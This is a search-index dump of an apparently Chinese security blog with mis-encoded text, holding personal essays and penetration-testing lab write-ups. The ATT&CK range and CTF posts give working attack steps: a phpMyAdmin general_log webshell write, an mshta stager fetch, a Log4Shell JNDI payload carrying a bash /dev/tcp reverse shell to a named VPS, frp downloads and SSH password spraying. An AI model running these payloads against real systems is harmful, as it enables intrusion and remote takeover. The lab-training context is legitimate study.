{"pages":[{"title":"å››å¤§çš†ç©º","text":"","link":"/404.html"},{"title":"","text":"","link":"/categories/index.html"},{"title":"About Me","text":"Meçˆ±æ˜¯æ’ä¹…å¿è€~ 26 å²ï¼Œæ˜¯ä¸Šç­ä¸‰å¹´çš„ç©·å±Œä¸ã€‚ æˆé•¿ ingã€‚ä½†æ˜¯æˆ‘è¿˜æ˜¯ä¸€æèŠ± çˆ±å¥½ï¼šå”±æ­Œã€æ‘¸é±¼~~ å–œæ¬¢ï¼šèœ¡ç¬”å°æ–°ã€æŸ¯å— è®¨åŒï¼šæ— å˜å¤´çš„äºº è¿åŠ¨ï¼šä¹’ä¹“çƒ ğŸ“ ç¯®çƒ ç›®æ ‡ï¼šæ¸—é€å¤§ä½¬ || python || webå…¨æ ˆ || äººæ°‘è®²å¸ˆ æ¢¦æƒ³ï¼šæ²¡æœ‰æ¢¦æƒ³","link":"/about/index.html"},{"title":"","text":"","link":"/archives/index.html"},{"title":"About Site","text":"Blogæ‹¾å…‰ä¸­ã€‚ã€‚ã€‚ å°ç«™æ€»æ˜¯å†™äº›æŠ€æœ¯æ€§çš„æ–‡ç« ï¼Œæ€»æ˜¾å¾—æœ‰äº›è®¸ç”Ÿç¡¬äº†äº›ã€‚ ç”Ÿæ´»çš„æ°”æ¯æ€»ä¸èƒ½ç¼ºå°‘ã€‚ä»¥åè¿˜æ˜¯æƒ³ç€æœ‰æ›´å¤šå…³äºç”Ÿæ´»ï¼Œå…³äºæ€æƒ³ï¼Œå…³äºæ„Ÿæ‚Ÿçš„ä¸œè¥¿è¿¸å‘å‡ºæ¥ã€‚ å‡¡æœ‰ä¸€ä¸ªäººçš„ä¸»å¼ ï¼Œå¾—äº†èµå’Œï¼Œæ˜¯ä¿ƒå…¶å‰è¿›çš„ï¼Œå¾—äº†åå¯¹ï¼Œæ˜¯ä¿ƒå…¶å¥‹æ–—çš„ï¼Œç‹¬æœ‰å«å–Šäºç”Ÿäººä¸­ï¼Œè€Œç”Ÿäººå¹¶æ— ååº”ï¼Œæ—¢éèµåŒï¼Œä¹Ÿæ— åå¯¹ï¼Œå¦‚ç½®èº«æ¯«æ— è¾¹é™…çš„è’åŸï¼Œæ— å¯æªæ‰‹çš„äº†ï¼Œè¿™æ˜¯æ€æ ·çš„æ‚²å“€å‘µï¼Œæˆ‘äºæ˜¯ä»¥æˆ‘æ‰€æ„Ÿåˆ°è€…ä¸ºå¯‚å¯ã€‚ â€‹ â€”â€”é²è¿…ã€Šå‘å–Šã€‹","link":"/about/site.html"},{"title":"å¯çˆ±çš„å¥³å­©å­","text":"","link":"/girls/index.html"},{"title":"æˆ‘çš„å°ä¼™ä¼´ä»¬","text":"","link":"/links/index.html"},{"title":"","text":"","link":"/tags/index.html"}],"posts":[{"title":"é‡æ–°å¼€å§‹","text":"æ ‡é¢˜ä¸€æ ‡é¢˜äºŒæ ‡é¢˜ä¸‰â€‹ æ—¶è¿‡å¢ƒè¿ï¼Œå¾®ä¿¡å…¬ä¼—å·å¼€é€šåˆ°é›¶é›¶æ•£æ•£çš„å‘äº†å‡ ç¯‡æ–‡ç« å·²ç»æ˜¯2019å¹´çš„äº‹æƒ…äº†ã€‚é‚£ä¸ªæ—¶å€™è¿˜æ˜¯ä¸ªæ„æ°”é£å‘ã€æœæ°”è“¬å‹ƒçš„ç²¾ç¥å°ä¼™ã€‚åªèº«ä¸€äººå°±æ¯…ç„¶å†³ç„¶çš„è·‘åˆ°äº†åŒ—äº¬ï¼Œæƒ³å¼€æ‹“äº†ä¸€ç‰‡å±äºè‡ªå·±çš„å¤©åœ°ï¼Œå¯èƒ½è¿™å°±æ˜¯é‚£ä¸ªæ—¶å€™å¹´è½»äººæ‰€è°“çš„â€œæ¢¦æƒ³â€œå§ã€‚ â€‹ ä¸€è½¬çœ¼å†å›æƒ³æ—¶ï¼Œå·²ç»å¿«è¿‡äº†æœ‰å››å¹´çš„æ—¶é—´äº†ã€‚é‚£ä¸ªæ—¶å€™è¿˜æ²¡æœ‰ç–«æƒ…ï¼Œç›®å‰ç”Ÿæ´»æ–¹å¼å’Œç‰¹ç‚¹å’Œå½“åˆæ¥è¯´å·²ç»å‘ç”Ÿäº†è¾ƒå¤§çš„å˜åŒ–äº†ã€‚çœŸçš„ä¸ä»…æ˜¯ç”Ÿæ´»æ–¹å¼å’Œå¤§ç¯å¢ƒå‘ç”Ÿäº†å˜åŒ–ï¼Œäººçš„å¿ƒæ€æ›´æ˜¯å‘ç”Ÿäº†æ›´å¤§çš„å˜åŒ–ã€‚ â€‹ ä»Šå¤©åˆšå¥½å’Œå‰åŒäº‹å•†é‡æ¢å¤å…¬ä¼—å·çš„è¿è¥ï¼Œå‰åŒäº‹ä¹Ÿæ˜¯æ¬£ç„¶çš„ç­”åº”æ¥å—äº†ã€‚æŒºå¥½çš„ï¼Œè™½ç„¶æœ€è¿‘ä¸¤å¹´ä¸€ç›´åœ¨å°è¯•ç€å†™åšå®¢ï¼Œä½†æ˜¯æ€»è§‰å¾—ç¼ºç‚¹ä»€ä¹ˆä¸œè¥¿ã€‚æ€»æ„Ÿè§‰è‡ªå·±å¤„äºä¸€ä¸ªä¸ä¼¦ä¸ç±»çš„ç”Ÿæ´»å’Œå·¥ä½œçŠ¶æ€ä¸­ã€‚è‡ªå·±æ€»æƒ³ç€æ”¹å˜è‡ªå·±çš„ç”Ÿæ´»æ–¹å¼å’ŒèŠ‚å¥çŠ¶æ€ï¼Œä½†æ€»æ„Ÿè§‰å¿ƒæœ‰ä½™è€ŒåŠ›ä¸è¶³ã€‚å…¶å®è¿™é‡Œçš„åŠ›ä¸è¶³å¹¶ä¸æ˜¯è¯´è‡ªå·±èƒ½åŠ›ä¸å¤Ÿï¼Œè€Œæ˜¯è‡ªå·±æ²¡æœ‰ä¸€ä¸ªæŒä¹‹ä»¥æ’çš„æ€åº¦ï¼Œå»é•¿æœŸåšæŒåšå¥½ä¸€ä»¶äº‹æƒ…ã€‚æ¯”å¦‚å†™å…¬ä¼—å·ã€çœ‹ä¹¦ã€å­¦è‹±è¯­ã€æ—©èµ·è¿™äº›ä¹‹å‰ç»™è‡ªå·±å®šçš„è®¡åˆ’å’Œå®‰æ’ï¼Œæ€»æ²¡æœ‰ä¸€ä¸ªæˆåŠŸè½åœ°å®æ–½çš„ã€‚è‡ªå·±æ€»æ˜¯å¤„äºä¸€ç§å¿ƒæµ®æ°”èºçš„çŠ¶æ€ï¼Œå›«å›µåæ£ï¼Œå•¥éƒ½åšä¸€åšï¼Œå•¥éƒ½å¼„ä¸€å¼„ï¼Œä½†æ˜¯å•¥éƒ½ä¸ä¸“ç²¾ã€‚å…¶å®è¯´ç™½äº†ï¼Œè¿™å°±æ˜¯ä¸€ç§æ— èƒ½çš„è¡¨ç°ã€‚ä¸€ä¸ªäººè¿æ§åˆ¶è‡ªå·±åšä»€ä¹ˆéƒ½åšä¸åˆ°ï¼Œé‚£å°±æ˜¯å¤„äºè¢«æŸç§ä¸œè¥¿æ”¯é…çš„ç°çŠ¶ä¸‹è·å–çŸ­æš‚çš„åŠæ—¶è¡Œä¹ï¼Œåˆ°å¤´æ¥å´ä¸€æ— æ˜¯å¤„ã€‚å…¶å®çœŸçš„å¼€å¿ƒä¹ˆï¼Œæˆ–è®¸æ˜¯çŸ­æš‚çš„å¼€å¿ƒï¼Œå†²å†…å¿ƒé‡Œæ¥è¯´ï¼Œè‡ªå·±ä¸æ„¿æ„å¤„äºè¿™ç§ç°çŠ¶ä¸­ï¼Œä½†æ˜¯è‡ªå·±å´åˆæ— åŠ›èµ°å‡ºæ¥ã€‚ â€‹ å€Ÿç€è¿™ä¸ªæœºä¼šåˆšå¥½æ€»ç»“ä¸€ä¸‹è¿™æ®µæ—¶é—´çš„ç°çŠ¶ã€‚æœ€è¿‘ä¸€ç›´å›´ç»•ç€å·¥ä½œä¸åœçš„çæŠ˜è…¾ï¼Œæœ€è¿‘ä¸‹åŠå¹´å‰å‰ååä¸¤ä¸ªæœˆæ—¶é—´é‡Œæ¢äº†ä¸‰ä»½å·¥ä½œã€‚å…¶å®è‡ªå·±åœ¨æƒ³åˆ°åº•æ˜¯å·¥ä½œç¯å¢ƒä¸å¯¹ï¼Œè¿˜æ˜¯æˆ‘è¿™ä¸ªäººä¸å¯¹ã€‚å¤§æ¦‚æ˜¯æˆ‘è¿™ä¸ªäººå‡ºäº†é—®é¢˜ï¼Œæˆ‘çš„å¿ƒæ€å˜å¾—å¼‚å¸¸æµ®èºï¼Œå¯¹äºèº«è¾¹çš„ä¸€åˆ‡éƒ½å¼€å§‹å˜å¾—æƒ¶æã€ç„¦èºä¸å®‰ã€‚è§‰å¾—å·¥ä½œç¯å¢ƒä¸åˆé€‚ï¼Œä¸åˆ©äºæˆ‘çš„ä¸ªäººå‘å±•ï¼Œåœ¨è¯¸å¤šæ–¹é¢å—åˆ°äº†å‹åˆ¶ï¼Œæ€»æ˜¯çœ‹åˆ°è¿™äº›ä¸å¥½çš„å±‚é¢ã€‚å›æƒ³ä¸€ä¸‹å½“åˆçš„å·¥ä½œå¿ƒæ€å°±æ˜¯å•çº¯çš„ï¼Œè¿›å…¥å®‰å…¨è¡Œä¸šï¼ŒåŠªåŠ›å­¦ä¹ å®‰å…¨æŠ€æœ¯å°±å¥½ã€‚ä½†æ˜¯ç°åœ¨ä¸ä¸€æ ·äº†ï¼Œéšç€å·¥ä½œç»éªŒçš„å¢åŠ ï¼ŒæŠ€æœ¯çš„æ‰€è°“æå‡ï¼Œèƒ½åŠ›çš„æ‰€è°“å¢åŠ ï¼Œä¸€ä¸ªäººçš„å¿ƒæ€å‘ç”Ÿäº†å®Œå…¨çš„å˜åŒ–ã€‚äººçš„æ¬²æœ›å¼€å§‹å¢åŠ ï¼Œä¸å•çº¯äºæŠ€æœ¯çš„æå‡ï¼Œäººå˜å¾—ä¸çº¯ç²¹äº†ï¼Œæ›´å¤šçš„æƒ³ç€é’±æ€ä¹ˆæŒ£å¤šäº†ï¼Œåœ°ä½æå‡äº†ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åšé¢†å¯¼äº†ã€‚å†è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„ç¯å¢ƒéƒ½ä¸æ»¡è¶³è‡ªå·±äº†ã€‚ â€‹ æ”¹å˜å§ï¼Œä»å¿ƒæ€ä¸Šå¼€å§‹ã€‚æ…¢æ…¢é€‚åº”ï¼Œæ…¢æ…¢æå‡ã€‚å¸Œæœ›å…¬ä¼—å·çš„è¿è¥èƒ½å¤Ÿå†æ¬¡å¯ç¨‹ï¼Œå’Œæœ‹å‹å…±åŒç»è¥ä¸‹èƒ½å¤Ÿè¶Šæ¥è¶Šå¥½å§ï¼èƒ¡æ‰¯äº†è¿™ä¹ˆå¤šæœ‰çš„æ²¡çš„ï¼Œå°±è¿™æ ·å§ï¼Œç»“æŸã€‚","link":"/2021/11/24/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/newstart/"},{"title":"windowsä¸‹ipä¿®æ”¹å°å…¬ä¸¾","text":"åœºæ™¯è¯´æ˜å…¬å¸ç»å¸¸ä¼šä¸¾åŠç›¸å…³çº¿ä¸‹çš„å®‰å…¨çš„ç«èµ›ï¼Œæ”¯æ’‘ç«èµ›è¿‡ç¨‹ä¸­ç»å¸¸é‡åˆ°æµ‹è¯•ç½‘ç»œç¯å¢ƒåŠé¶æœºç¯å¢ƒæ˜¯å¦æ­£å¸¸ï¼Œæ­¤è¿‡ç¨‹éœ€è¦ä¸æ–­ä¿®æ”¹ä¸»æœºçš„IPåœ°å€ã€‚æ‰€ä»¥å¼€å‘å¯¹åº”å°å·¥å…·æ¥ç®€åŒ–ç›¸å…³æ“ä½œæµç¨‹ã€‚åŠŸèƒ½è¾ƒä¸ºç®€é™‹ï¼Œåªæ˜¯ç®€å•çš„ç›¸å…³å®ç°ã€‚ åŸºæœ¬æ¶æ„pyqt + python + win æ¨¡å—å®ç° åªèƒ½è¿è¡Œwindowsæ“ä½œç³»ç»Ÿå¹³å° åŠŸèƒ½ä»‹ç»1 å¯¹åº”ç½‘å¡é€‰æ‹©åŠåœ°å€æŸ¥è¯¢ 2 é™æ€åœ°å€è®¾ç½®æ”¯æŒæ‰‹åŠ¨ipåœ°å€è¾“å…¥é™æ€é…ç½®ï¼Œç½‘å…³å¯ä¸ºç©º 3 ç½‘ç»œåœ°å€ä½å¢ 1 å‡ 1ç›®å‰åªå®ç°äº†24ä½æ©ç ç½‘ç»œä½åœ°å€å¢1å‡1åŠŸèƒ½ 4 ä¸€é”®DHCPåŠŸèƒ½é™æ€åœ°å€é…ç½®å®Œæˆåï¼Œå¯å®ç°ä¸€é”®ç¯å¢ƒç½‘å¡çš„dhcpåŠŸèƒ½ 5 ç®€å•webè¯·æ±‚è¾“å…¥å¯¹åº”çš„ipåœ°å€å¯å®ç°ç®€å•webè¯·æ±‚åŠŸèƒ½ï¼Œè¿”å›å¯¹åº”ç½‘é¡µçš„çŠ¶æ€ç åŠåŸå§‹é¡µé¢å†…å®¹ã€‚ç”¨äºç®€å•åˆ¤æ–­ç›®æ ‡ç½‘ç«™èƒ½å¦æ­£å¸¸è®¿é—® é¡¹ç›®é“¾æ¥æºç  å·¥å…·å®‰è£…åŒ…","link":"/2021/03/17/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/win-changeip-tool/"},{"title":"å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†","text":"å†…ç½‘æ¸—é€ä¿¡æ¯æ”¶é›†0x01 åŸºæœ¬å‘½ä»¤ è·å–ä¸»æœºå 1hostname æŸ¥è¯¢æ‰€æœ‰è®¡ç®—åç§° 1dsquery computer æŸ¥çœ‹é…ç½®åŠè¡¥ä¸ä¿¡æ¯ 12systeminfowmic qfe get description,installedOn /format:csv ç³»ç»Ÿç‰ˆæœ¬ 1ver è¿›ç¨‹ä¿¡æ¯ 123tasklist /svcwmic process get caption,executablepath,commandline /format:csvget-process æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå˜é‡ 1set æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ 1schtasks /QUERY /fo LIST /v æŸ¥çœ‹å®‰è£…é©±åŠ¨ 1DRIVERQUERY æ“ä½œç³»ç»Ÿä¿¡æ¯ 12æ¶æ„ wmic os get osarchitectureç³»ç»Ÿå wmic os get caption æŸ¥çœ‹é€»è¾‘ç›˜ wmic logicaldisk get caption æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ä¿¡æ¯ wmic product get name,version æŸ¥çœ‹æœåŠ¡ä¿¡æ¯ wmic service list brief sc query 0x02 åŸŸä¿¡æ¯","link":"/2021/08/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Network-infiltration-base/"},{"title":"ATT&amp;CK_01é¶åœºå­¦ä¹ ","text":"ç¯å¢ƒé…ç½®é¶åœºç¯å¢ƒéƒ¨ç½²æ—¶ï¼Œwin7è™šæœºéœ€è¦è¿›å…¥ç³»ç»Ÿæ‰‹åŠ¨å¼€å¯ä¸€ä¸‹phpstudyï¼Œä¸”å…³é—­é˜²ç«å¢™ã€‚ ç»¼åˆæ¸—é€ä¿¡æ¯æ”¶é›†æŸ¥çœ‹æœ¬æœºåœ°å€æ®µï¼Œä½¿ç”¨netdiscoverå‘ç°åŒæ®µå­˜æ´»ä¸»æœº 1netdiscover -i eth0 -r 192.168.49.0/24 ä½¿ç”¨nmapæ‰«æç›®å‰ä¸»æœºç«¯å£å¼€æ”¾æƒ…å†µ 1nmap -T4 -A -v -sS 192.168.49.129 ç«™ç‚¹ç›®å½•æ‰«æ 1python3 dirsearch.py -u &quot;http://192.168.49.129/&quot; -e php æ¼æ´åˆ©ç”¨phpmyadminå†™æ—¥å¿—getshellwebè®¿é—®å‘ç°ç›´æ¥æ˜¯phpstudyæ¢é’ˆ,é€šè¿‡æ¢é’ˆæµ‹è¯•å‡ºmysqlå­˜åœ¨å¼±å£ä»¤root/root å› ä¸ºphpstudyå­˜åœ¨phpmyadminç»„ä»¶ï¼Œç›´æ¥åˆ©ç”¨phpmyadminå®ç°å†™webshellæ“ä½œ 1select '&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;' into outfile 'C:/phpStudy/WWW/shell.php' ä½†æ˜¯å¼€å¯äº†å†™æ–‡ä»¶é™åˆ¶ ä½†æ˜¯è¿™é‡Œå¯ä»¥å°è¯•ä½¿ç”¨æ—¥å¿—æ–‡ä»¶getshell é¦–å…ˆæŸ¥çœ‹æ—¥å¿—çŠ¶æ€ 1show variables like '%general%'; å½“å¼€å¯generalæ—¶ï¼Œæ‰€æ‰§è¡Œçš„sqlè¯­å¥éƒ½ä¼šå‡ºç°åœ¨stu1.logæ–‡ä»¶ä¸­ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¿®æ”¹generallogfileçš„å€¼ï¼Œé‚£ä¹ˆæ‰€æ‰§è¡Œçš„sqlè¯­å¥å°±ä¼šå¯¹åº”ç”Ÿæˆå¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œè¿›è€Œgetshellã€‚ 12SET GLOBAL general_log='on'set GLOBAL general_log_file='C:/phpStudy/WWW/shell.php' å†æ¬¡æ‰§è¡Œå«æœ‰shellçš„è¯­å¥ï¼Œè¯·æ±‚å‘ç°å†™å…¥æˆåŠŸ åå°å¼±å£ä»¤getshell æ ¹æ®å¤‡ä»½ç«™ç‚¹æ–‡ä»¶è·å–å®Œæ•´è·¯å¾„ä¿¡æ¯ 1http://192.168.49.129/yxcms/protected/apps/default/view/default/hack.php å­˜å‚¨å‹XSSå‰å°æ³¨å†Œç”¨æˆ·ç•™è¨€æ¿æ’å…¥,åå°å®¡æ ¸é€šè¿‡å³å¯è§¦å‘ã€‚ åœ¨å®é™…ä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œå¯ä»¥ä»¥æ¬¡è·å–ç®¡ç†ç”¨æˆ·cookieï¼Œä¼ªé€ ç™»å½• ä¸»æœºä¸Šçº¿csä¸»æœºä¸Šçº¿ææƒä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥shell ä½¿ç”¨cs htmlä¸Šçº¿ä¸»æœºï¼Œä¸”æ˜¯administratoræƒé™ã€‚ 1mshta http://192.168.49.130:80/download/file.ext ä½¿ç”¨cså†…å»ºææƒç ï¼ŒæˆåŠŸæè‡³ç®¡ç†å‘˜æƒé™ ä¸»æœºä¿¡æ¯æ”¶é›†shell ipconfig /allè·å–å†…ç½‘ä¸»æœºç½‘æ®µä¸º192.168.29.0/24 åŸŸä¸º god.org æŸ¥çœ‹åŸŸä¿¡æ¯ shell net group /domain ä¸Šä¼ 3389.batè„šæœ¬å¼€å¯3389ç«¯å£ ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿›è¡Œè¿æ¥ ä¸Šä¼ frpä»£ç†å®ç°socks5å†…ç½‘ç©¿é€","link":"/2021/10/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT-CK-01/"},{"title":"ç¬¬ä¸‰æœŸcfsé¶åœºç»ƒä¹ ","text":"123payload=${jndi:ldap://4o5zj6.dnslog.cn/cxvahp}vpsï¼š139.196.234.164bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1 Apache log4j2æ¼æ´(CVE-2021-44228)10.134.110.23:8080 flag1: flag{ee5645e88bd351505554be5016ef505e}ç¬¬ä¸€æ­¥ï¼š 1payload=${jndi:ldap://139.196.234.164:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx} æ³¨ï¼šåé¢commandéœ€è¦ç»è¿‡ä¸€æ¬¡base64ç¼–ç ï¼Œä¸¤æ¬¡URLç¼–ç å¤„ç† 1command: bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1 ç¬¬äºŒæ­¥ï¼š vpsç›‘å¬ 1nc -lvvp 5555 å¼€å¯æ¶æ„ldapæœåŠ¡ 1java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080 æˆåŠŸä¸Šçº¿ 10.134.110.23 å†…ç½‘æ¢æµ‹ 1234567891011121314151617181920212223242526272829303132333435363738394041root@66f6d6f3234c:/tmp# ./fscan_amd64 -h 10.134.0.0/16./fscan_amd64 -h 10.134.0.0/16 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.6.3start infoscan(icmp) Target '10.134.110.23' is alive(icmp) Target '10.134.110.1' is alive(icmp) Target '10.134.110.26' is alive(icmp) Target '10.134.110.34' is aliveicmp alive hosts len is: 410.134.110.34:8093 open10.134.110.1:22 open10.134.110.34:8083 open10.134.110.34:8080 open10.134.110.26:8080 open10.134.110.1:8080 open10.134.110.23:8080 open10.134.110.34:8009 open10.134.110.26:8009 openalive ports len is: 9start vulscan[*] WebTitle:http://10.134.110.34:8080 code:200 len:1507 title:Welcome to JBos s&amp;trade;[*] WebTitle:http://10.134.110.23:8080 code:404 len:0 title:None[*] WebTitle:http://10.134.110.1:8080 code:404 len:0 title:None[+] InfoScan:http://10.134.110.23:8080 [SprintBoot][*] WebTitle:http://10.134.110.26:8080 code:200 len:20 title:Apache Tomcat/8 .0.43[+] InfoScan:http://10.134.110.34:8080 [Jboss JBOSS][*] WebTitle:http://10.134.110.34:8083 code:400 len:0 title:None[+] InfoScan:http://10.134.110.1:8080 [SprintBoot][+] http://10.134.110.26:8080/manager/html tomcat tomcat[+] http://10.134.110.26:8080 poc-yaml-tomcat-manager-weekå·²å®Œæˆ 8/9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remainå·²å®Œæˆ 8/9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remainå·²å®Œæˆ 8/9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remainå·²å®Œæˆ 9/9scan end éƒ¨ç½²frpå†…ç½‘ç©¿é€å·¥å…· ä½¿ç”¨wgetä¸Šä¼ æ–‡ä»¶è‡³å¤–ç½‘æœº wget http://139.196.234.164:8000/frpc wget http://139.196.234.164:8000/frpc.ini frpè¿æ¥ server:./frps -c frps.ini client:./frpc -c frpc.ini 10.134.110.26:8080 å­˜åœ¨toamcatå¼±å£ä»¤éƒ¨ç½²waråŒ… ä¸Šä¼ èšå‰‘é©¬ flag3ï¼š flag{a457f1dd3623a399d78a9672d225ddd5} 10.134.110.34:8080 JBOSS å‘½ä»¤æ‰§è¡Œ flag4ï¼šflag{4b0e8838ced75dbb359414892942d19d} 172.78.69.16 172.78.69.15:8080 å­˜åœ¨shireååºåˆ—åŒ–æ¼æ´ flag2: flag{b2a0b3a262c1234132672229af281ed6}","link":"/2021/12/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/"},{"title":"å†…ç½‘æ¸—é€ä¹‹ä»£ç†è½¬å‘","text":"åœ¨æ—¥å¸¸æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå½“æˆ‘ä»¬getshellä¸€å°è¾¹ç•Œä¸»æœºåï¼Œç»å¸¸éœ€è¦å€ŸåŠ©è¾¹ç•Œä¸»æœºå®ç°å¯¹å†…ç½‘ä¸»æœºæµé‡çš„è½¬å‘å’Œä»£ç†æ“ä½œã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€äº›ä»£ç†è„šæœ¬å’Œè½¬å‘å·¥å…·å°†å†…ç½‘çš„æµé‡ä»£ç†å’Œè½¬å‘åˆ°æœ¬åœ°è¿›è¡Œè®¿é—®ï¼Œä»¥æ–¹ä¾¿æˆ‘ä»¬åç»­å†…ç½‘æ¸—é€ã€‚è¿™è¾¹ç€é‡ä»‹ç»ä¸€ä¸‹åœ¨å†…ç½‘æ¸—é€ä¸­å¸¸ç”¨çš„å‡ ç§è½¬å‘åè®®çš„ç‰¹ç‚¹å’Œä»£ç†å·¥å…·çš„ä½¿ç”¨ã€‚ ä»£ç†çš„åˆ†ç±»æ­£å‘ä»£ç†ä»£ç†æœåŠ¡å™¨ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„ä¸€å°æœåŠ¡å™¨ï¼Œä¸”proxyå’ŒclientåŒå±äºä¸€ä¸ªåŒºåŸŸï¼Œå¯¹serveræ˜¯é€æ˜çš„ï¼›å…¶ä½œç”¨æ˜¯ä»ç›®æ ‡æœåŠ¡å™¨å–å¾—å†…å®¹ï¼Œå®¢æˆ·ç«¯å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æŒ‡å®šç›®æ ‡ï¼Œç„¶åä»£ç†æœåŠ¡å™¨å‘ç›®æ ‡æœåŠ¡å™¨è½¬äº¤è¯·æ±‚å¹¶å°†è·å¾—çš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ï¼ˆç±»ä¼¼äºç°å®ç”Ÿæ´»ä¸­çš„ä¸­ä»‹ï¼‰ è¿è¡Œæµç¨‹ï¼šå®¢æˆ·ç«¯â€”â€”è¯·æ±‚â€”â€”&gt; ä»£ç†æœæœåŠ¡å™¨â€”â€”è¯·æ±‚â€”â€”&gt; æœåŠ¡ç«¯ ä»£ç†ç‰¹ç‚¹ï¼š å®¢æˆ·ç«¯æ— æ³•ç›´æ¥è®¿é—®åˆ°æœåŠ¡ç«¯çš„ç›®æ ‡åº”ç”¨ï¼Œä½†æ˜¯ä»£ç†æœåŠ¡å™¨å¯ä»¥ã€‚ï¼ˆå…¸å‹åœºæ™¯ï¼šFANQIANGï¼‰ ä»£ç†æœåŠ¡å™¨å¸®åŠ©å®¢æˆ·ç«¯è¯·æ±‚é¡µé¢å¹¶ç¼“å­˜åœ¨æœ¬åœ°ï¼Œå¹¶å°†é¡µé¢è¿”å›åˆ°å®¢æˆ·ç«¯ å®¢æˆ·ç«¯éœ€è¦è®¾ç½®ä»£ç†æœåŠ¡å™¨åœ°å€å’Œç«¯å£ï¼ˆæ’ä»¶åŒ–ï¼‰ï¼Œå®¢æˆ·ç«¯çŸ¥é“ä»£ç†æœåŠ¡å™¨çš„å­˜åœ¨ æœ¬è´¨ä¸Šä»£ç†æœåŠ¡å™¨ä»£ç†äº†å®¢æˆ·ç«¯å»å’ŒæœåŠ¡ç«¯è¯·æ±‚äº¤äº’çš„ä»»åŠ¡ åå‘ä»£ç†ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥æ”¶ç½‘ç»œè¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™ç½‘ç»œä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ã€‚ä»£ç†æœåŠ¡å™¨å’ŒæœåŠ¡ç«¯å…±å¤„äºä¸€ä¸ªåŒºåŸŸä¸­ï¼Œå¯¹å®¢æˆ·ç«¯æ˜¯é€æ˜çš„ã€‚ ä»£ç†ç‰¹ç‚¹ï¼š å®¢æˆ·ç«¯ä¸æ¸…æ¥šæœåŠ¡ç«¯æ˜¯å¦å­˜åœ¨ä»£ç†æœåŠ¡å™¨ï¼Œä»¥ä¸ºè¯·æ±‚çš„ä»£ç†æœåŠ¡å™¨å°±æ˜¯çœŸæ­£çš„æœåŠ¡ç«¯ ä»£ç†æœåŠ¡å™¨å°†æœåŠ¡ç«¯é¡µé¢ç¼“å­˜åˆ°æœ¬åœ°ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚æ—¶ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ— éœ€ä»»ä½•é…ç½®ï¼Œä¸”ä¸çŸ¥é“çœŸå®æœåŠ¡ç«¯çš„å­˜åœ¨ åº”ç”¨åœºæ™¯ï¼šéšè—æœåŠ¡ç«¯çœŸå®IPã€è´Ÿè½½å‡è¡¡ã€æé«˜è®¿é—®é€Ÿåº¦ã€å¢å¼ºå®‰å…¨æ€§ ä»£ç†å·¥å…·lcx","link":"/2021/12/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"},{"title":"Log4j2åŸºäºJDBCAPPENDERé…ç½®æ–‡ä»¶ä»»æ„æ–‡ä»¶æ‰§è¡Œ(CVE-2021-44832)","text":"å‰æœŸlog4j2å­˜åœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-44228ï¼‰å¼•èµ·äº†è½©ç„¶å¤§æ³¢ã€‚æ˜¨å¤©ä¸Šç½‘å†²æµªå‘ç°ï¼Œcheckmarkç ”ç©¶å‘˜YANIV NIZRYå…¬å¸ƒäº†æ–°ç‰ˆæœ¬log4j2 2.17.0ä¸­å­˜åœ¨åŸºäºJDBCAPPENDERé…ç½®æ–‡ä»¶çš„ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ä¸”è¯¥æ¼æ´å·²ç»å…¬å¸ƒå…¶CVEç¼–å·ä¸ºCVE-2021-44832ã€‚ 